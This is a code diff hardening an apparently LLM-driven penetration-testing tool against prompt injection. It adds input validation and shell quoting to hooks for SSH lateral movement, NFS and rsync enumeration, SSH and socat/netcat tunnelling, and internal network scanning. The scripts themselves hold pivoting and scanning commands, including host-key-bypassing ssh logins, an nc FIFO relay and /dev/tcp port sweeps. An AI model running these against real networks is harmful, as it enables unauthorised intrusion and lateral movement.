@@ -1,12 +1,29 @@
 import { bash, sh, activeExec, argVal, hasFlag } from "./shared"
 import type { Finding, HookResult } from "./shared"
+import { Shell } from "@/util/shell"
 
 export async function sshPivot(args: string[], timeout: number): Promise<HookResult> {
   const findings: Finding[] = []
   const output: string[] = ["=== SSH Lateral Movement ==="]
-  const target = argVal(args, "--target")
-  const key = argVal(args, "--key")
-  const user = argVal(args, "--user") || "root"
+  const rawTarget = argVal(args, "--target")
+  const rawKey = argVal(args, "--key")
+  const rawUser = argVal(args, "--user") || "root"
+  // Quote + validate: these flow into `bash -c` and originate from the LLM,
+  // which ingests attacker-controlled crawl/HTTP content (prompt injection).
+  let target = ""
+  let key = ""
+  let user = "root"
+  try {
+    if (rawTarget) target = Shell.host(rawTarget, "--target")
+    if (rawKey) {
+      if (!/^[/A-Za-z0-9._-]+$/.test(rawKey)) throw new Error("invalid --key: unsafe path characters")
+      key = rawKey
+    }
+    if (!/^[A-Za-z0-9._-]{1,64}$/.test(rawUser)) throw new Error("invalid --user")
+    user = rawUser
+  } catch (e) {
+    return { output: `ERROR: ${e instanceof Error ? e.message : e}`, findings }
+  }
 
   const script = `
 echo "--- Known Hosts (potential targets) ---"
@@ -60,8 +77,8 @@ ${
   target
     ? `
 echo ""
-echo "--- Attempting connection to ${target} ---"
-ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no ${key ? `-i ${key}` : ""} ${user}@${target} "hostname; id; ip addr show 2>/dev/null | grep inet" 2>&1
+echo "--- Attempting connection to ${Shell.quote(target)} ---"
+ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no ${key ? `-i ${Shell.quote(key)}` : ""} ${Shell.quote(`${user}@${target}`)} "hostname; id; ip addr show 2>/dev/null | grep inet" 2>&1
 `
     : ""
 }
@@ -380,15 +397,20 @@ salt '*' test.ping 2>/dev/null 2>&1 | head -10
 export async function nfsMountAttack(args: string[], timeout: number): Promise<HookResult> {
   const findings: Finding[] = []
   const output: string[] = ["=== NFS Mount Attack ==="]
-  const target = argVal(args, "--target") || "localhost"
+  let target = "localhost"
+  try {
+    target = Shell.host(argVal(args, "--target") || "localhost", "--target")
+  } catch (e) {
+    return { output: `ERROR: ${e instanceof Error ? e.message : e}`, findings }
+  }
 
   const script = `
 echo "--- Local NFS Exports ---"
 cat /etc/exports 2>/dev/null
 
 echo ""
-echo "--- Remote NFS Shares (${target}) ---"
-showmount -e ${target} 2>/dev/null || echo "[-] showmount failed or not available"
+echo "--- Remote NFS Shares (${Shell.quote(target)}) ---"
+showmount -e ${Shell.quote(target)} 2>/dev/null || echo "[-] showmount failed or not available"
 
 echo ""
 echo "--- Currently Mounted NFS ---"
@@ -398,7 +420,7 @@ df -h 2>/dev/null | grep ":"
 echo ""
 echo "--- NFS Configuration ---"
 cat /etc/nfs.conf 2>/dev/null | grep -vE "^(#|$)" | head -20
-rpcinfo -p ${target} 2>/dev/null | grep -i nfs
+rpcinfo -p ${Shell.quote(target)} 2>/dev/null | grep -i nfs
 
 echo ""
 echo "--- Checking no_root_squash ---"
@@ -440,19 +462,24 @@ grep -i "no_root_squash" /etc/exports 2>/dev/null
 export async function rsyncExploit(args: string[], timeout: number): Promise<HookResult> {
   const findings: Finding[] = []
   const output: string[] = ["=== Rsync Exploitation ==="]
-  const target = argVal(args, "--target") || "localhost"
+  let target = "localhost"
+  try {
+    target = Shell.host(argVal(args, "--target") || "localhost", "--target")
+  } catch (e) {
+    return { output: `ERROR: ${e instanceof Error ? e.message : e}`, findings }
+  }
 
   const script = `
 echo "--- Rsync Configuration ---"
 cat /etc/rsyncd.conf 2>/dev/null || echo "[-] No rsyncd.conf found"
 
 echo ""
-echo "--- Enumerate Rsync Modules (${target}) ---"
-rsync ${target}:: 2>/dev/null || echo "[-] rsync enumeration failed or not available"
+echo "--- Enumerate Rsync Modules (${Shell.quote(target)}) ---"
+rsync ${Shell.quote(target)}:: 2>/dev/null || echo "[-] rsync enumeration failed or not available"
 
 echo ""
 echo "--- Check Anonymous Access ---"
-rsync --list-only ${target}:: 2>/dev/null | head -20
+rsync --list-only ${Shell.quote(target)}:: 2>/dev/null | head -20
 
 echo ""
 echo "--- Rsync Service Check ---"
@@ -483,9 +510,18 @@ export async function sshTunnel(args: string[], timeout: number): Promise<HookRe
   const findings: Finding[] = []
   const output: string[] = ["=== SSH Tunnel Setup ==="]
   const tunnelType = argVal(args, "--type") || "local"
-  const localPort = argVal(args, "--local-port") || "8080"
-  const remote = argVal(args, "--remote") || "127.0.0.1:80"
-  const target = argVal(args, "--target")
+  let localPort = "8080"
+  let remote = "127.0.0.1:80"
+  let target = ""
+  try {
+    if (!["local", "remote", "dynamic"].includes(tunnelType)) throw new Error("invalid --type")
+    localPort = Shell.port(argVal(args, "--local-port") || "8080", "--local-port")
+    remote = Shell.hostPort(argVal(args, "--remote") || "127.0.0.1:80", "--remote")
+    const raw = argVal(args, "--target")
+    if (raw) target = Shell.host(raw, "--target")
+  } catch (e) {
+    return { output: `ERROR: ${e instanceof Error ? e.message : e}`, findings }
+  }
 
   if (!target) {
     output.push(
@@ -511,9 +547,9 @@ export async function sshTunnel(args: string[], timeout: number): Promise<HookRe
   }
 
   let cmd = ""
-  if (tunnelType === "local") cmd = `ssh -f -N -L ${localPort}:${remote} ${target}`
-  if (tunnelType === "remote") cmd = `ssh -f -N -R ${localPort}:${remote} ${target}`
-  if (tunnelType === "dynamic") cmd = `ssh -f -N -D ${localPort} ${target}`
+  if (tunnelType === "local") cmd = `ssh -f -N -L ${localPort}:${Shell.quote(remote)} ${Shell.quote(target)}`
+  if (tunnelType === "remote") cmd = `ssh -f -N -R ${localPort}:${Shell.quote(remote)} ${Shell.quote(target)}`
+  if (tunnelType === "dynamic") cmd = `ssh -f -N -D ${localPort} ${Shell.quote(target)}`
 
   const script = `
 echo "--- Setting up ${tunnelType} tunnel ---"
@@ -547,8 +583,16 @@ ps aux | grep "ssh -" | grep -v grep
 export async function socatTunnel(args: string[], timeout: number): Promise<HookResult> {
   const findings: Finding[] = []
   const output: string[] = ["=== Socat/Netcat Tunnel ==="]
-  const listenPort = argVal(args, "--listen-port")
-  const forwardTo = argVal(args, "--forward-to")
+  const rawListen = argVal(args, "--listen-port")
+  const rawForward = argVal(args, "--forward-to")
+  let listenPort = ""
+  let forwardTo = ""
+  try {
+    if (rawListen) listenPort = Shell.port(rawListen, "--listen-port")
+    if (rawForward) forwardTo = Shell.hostPort(rawForward, "--forward-to")
+  } catch (e) {
+    return { output: `ERROR: ${e instanceof Error ? e.message : e}`, findings }
+  }
 
   const script = `
 echo "--- Available Tools ---"
@@ -568,10 +612,10 @@ ${
 echo ""
 echo "--- Creating Tunnel ---"
 if command -v socat >/dev/null 2>&1; then
-  echo "socat TCP-LISTEN:${listenPort},fork TCP:${forwardTo} &"
+  echo "socat TCP-LISTEN:${listenPort},fork TCP:${Shell.quote(forwardTo)} &"
   socat TCP-LISTEN:${listenPort},fork TCP:${forwardTo} &
 elif command -v ncat >/dev/null 2>&1; then
-  echo "ncat -lvkp ${listenPort} -c 'ncat ${forwardTo.split(":")[0]} ${forwardTo.split(":")[1]}' &"
+  echo "ncat -lvkp ${listenPort} -c 'ncat ${Shell.quote(forwardTo.split(":")[0])} ${Shell.quote(forwardTo.split(":")[1])}' &"
   ncat -lvkp ${listenPort} -c "ncat ${forwardTo.split(":")[0]} ${forwardTo.split(":")[1]}" &
 else
   echo "[-] No suitable tool found for tunneling"
@@ -614,8 +658,15 @@ echo "  mkfifo /tmp/.p; nc -l 8080 < /tmp/.p | nc 10.0.0.5 80 > /tmp/.p &"
 export async function internalScan(args: string[], timeout: number): Promise<HookResult> {
   const findings: Finding[] = []
   const output: string[] = ["=== Internal Network Scan ==="]
-  const subnet = argVal(args, "--subnet")
-  const ports = argVal(args, "--ports") || "22,80,443,3306,5432,6379,8080,8443"
+  let subnet = ""
+  let ports = "22,80,443,3306,5432,6379,8080,8443"
+  try {
+    const rawSubnet = argVal(args, "--subnet")
+    if (rawSubnet) subnet = Shell.host(rawSubnet, "--subnet")
+    ports = Shell.portList(argVal(args, "--ports") || ports, "--ports")
+  } catch (e) {
+    return { output: `ERROR: ${e instanceof Error ? e.message : e}`, findings }
+  }
 
   const script = `
 echo "--- Local Network Info ---"
@@ -631,12 +682,12 @@ ${
   subnet
     ? `
 echo ""
-echo "--- Host Discovery (${subnet}) ---"
+echo "--- Host Discovery (${Shell.quote(subnet)}) ---"
 if command -v nmap >/dev/null 2>&1; then
-  nmap -sn ${subnet} 2>/dev/null | grep -E "(scan report|Host is)"
+  nmap -sn ${Shell.quote(subnet)} 2>/dev/null | grep -E "(scan report|Host is)"
 elif command -v ping >/dev/null 2>&1; then
   echo "Using ping sweep..."
-  prefix=$(echo "${subnet}" | sed 's|/.*||; s|\\.[0-9]*$||')
+  prefix=$(echo ${Shell.quote(subnet)} | sed 's|/.*||; s|\\.[0-9]*$||')
   for i in $(seq 1 254); do
     ping -c 1 -W 1 "$prefix.$i" >/dev/null 2>&1 && echo "[+] $prefix.$i is alive" &
   done
@@ -644,13 +695,13 @@ elif command -v ping >/dev/null 2>&1; then
 fi
 
 echo ""
-echo "--- Port Scan (${subnet} : ${ports}) ---"
+echo "--- Port Scan (${Shell.quote(subnet)} : ${Shell.quote(ports)}) ---"
 if command -v nmap >/dev/null 2>&1; then
-  nmap -p ${ports} --open ${subnet} 2>/dev/null | grep -E "(scan report|open)"
+  nmap -p ${Shell.quote(ports)} --open ${Shell.quote(subnet)} 2>/dev/null | grep -E "(scan report|open)"
 else
   echo "Using bash /dev/tcp..."
-  prefix=$(echo "${subnet}" | sed 's|/.*||; s|\\.[0-9]*$||')
-  for port in $(echo "${ports}" | tr ',' ' '); do
+  prefix=$(echo ${Shell.quote(subnet)} | sed 's|/.*||; s|\\.[0-9]*$||')
+  for port in $(echo ${Shell.quote(ports)} | tr ',' ' '); do
     for i in 1 2 5 10 20 50 100 200; do
       (echo >/dev/tcp/$prefix.$i/$port) 2>/dev/null && echo "[+] $prefix.$i:$port OPEN" &
     done
